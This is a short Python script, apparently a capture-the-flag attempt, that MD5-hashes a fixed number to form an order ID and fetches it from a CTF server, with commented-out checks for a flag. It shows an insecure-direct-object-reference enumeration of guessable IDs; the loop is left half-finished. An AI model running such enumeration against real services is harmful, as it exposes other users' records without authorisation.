import hashlib, requests
for x in range(1, 56):
    hash_id = hashlib.md5(str(1231233).encode()).hexdigest()
    url = f'http://ctfinf.ru:10003/orders/{hash_id}'
    rq = requests.get(url)
    print(rq.text)
    break
    # if 'flag' in rq.text or 'vsosh' in rq.text:
    #     print(rq.text)
